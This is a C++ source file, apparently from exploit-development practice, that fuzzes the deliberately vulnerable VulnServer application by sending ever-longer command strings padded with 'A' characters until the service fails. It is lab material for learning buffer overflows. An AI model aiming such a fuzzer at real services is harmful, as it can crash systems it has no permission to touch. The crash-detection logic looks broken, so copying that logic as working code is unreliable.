//Exploit for VulnServer Made by Gremlin
#include "includesBufferOverflow.h"

int main(int argc, char** argv) {
	if (argc < 2) {
		printf("[+] Usage : FileName.exe [IP] [PORT (Default = 9999)]\n");
		return -1;
	}
#if defined(_WIN32)
	WSADATA d;
	if (WSAStartup(MAKEWORD(2, 2), &d)) {
		printf("[-] Failed to initialize socket !");
		return -1;
	}
#endif
	int exploitBytes;
	int returnedBytes;
	char readReturnedBuffer[4096];
	size_t bufferMultiplier = 10 + 5;
	std::string argument;
	printf("[+] What argument would you like to test against the vulnserver ? : ");
	std::getline(std::cin >> std::ws, argument);
	int multiplicator = {0};
	printf("[+] How much bytes you want to add to each loop ? (10-500 is a good interval for this) : ");
	std::cin >>multiplicator;
	int timeout = {0};
	printf("[+] Would you like to add a timeout between each requests ?(0 for no timeout) : ");
	std::cin>>timeout;
	system("clear");
	
	while (true) {
		try {
        		struct addrinfo hints;
        		memset(&hints, 0, sizeof(hints));
        		hints.ai_socktype = SOCK_STREAM;
       		 	struct addrinfo* peer_address;
        		if (getaddrinfo(argv[1], argv[2] ? argv[2] : "9999", &hints, &peer_address)) {
                		printf("[-] getaddrinfo failed !");
                		return -1;
        		}
        		char address_buffer[100];
        		char service_buffer[100];
        		//printf("[+] Configuring remote address...\n");
			getnameinfo(peer_address->ai_addr, peer_address->ai_addrlen, address_buffer, sizeof(address_buffer), service_buffer, sizeof(service_buffer), NI_NUMERICHOST);
   			printf("[+] Remote address is : %s\n", address_buffer);
        		printf("[+] Remote service is : %s\n", service_buffer);
        		//Socket Creation

        		//printf("[+] Creating socket...\n");
        		SOCKET socket_peer;
        		socket_peer = socket(peer_address->ai_family, peer_address->ai_socktype, peer_address->ai_protocol);
        		if (!ISVALIDSOCKET(socket_peer)) {
                		printf("[-] Socket failed !\n");
                		return -1;
        		}
			//printf("[+] Connecting...\n");
        		if (connect(socket_peer, peer_address->ai_addr, peer_address->ai_addrlen)) {
                		printf("[-] Connection to target is impossible !\n");
                		return -1;
        		}
			freeaddrinfo(peer_address);
			char buffer = 'A';
			std::string exploitBuffer(bufferMultiplier, buffer); //size_t bufferMultiplir, buffer -> this does multiply bufferMultiplier by size_t;
			std::string argExploit = argument + (argument.length() > 0 ? " " : "") + exploitBuffer;
			char* exploits = new char[argExploit.size() + 1]; //New char the size of our std::string
			std::copy(argExploit.begin(), argExploit.end(), exploits); //copy our exploitBuffer into char* exploits
			exploits[argExploit.size()] = '\0'; //Add null byte at the end
			exploitBytes = send(socket_peer, exploits, argExploit.size() + 1, 0); //Send it out	
			//printf("exploits : %s\n", exploits);
			printf("[+] Sent %d bytes to %s %s\n", exploitBytes, address_buffer, service_buffer); //Print the number of bytes sent
			bufferMultiplier = bufferMultiplier + multiplicator;
			delete[] exploits; //delete our temp exploits buffer
			if(timeout){
				sleep(timeout);
			}
			CLOSESOCKET(socket_peer);
		}
		catch (std::exception& e) {
			printf("[+] Target crashed at %ld bytes !", bufferMultiplier);
			return -1;
		}
	}
}
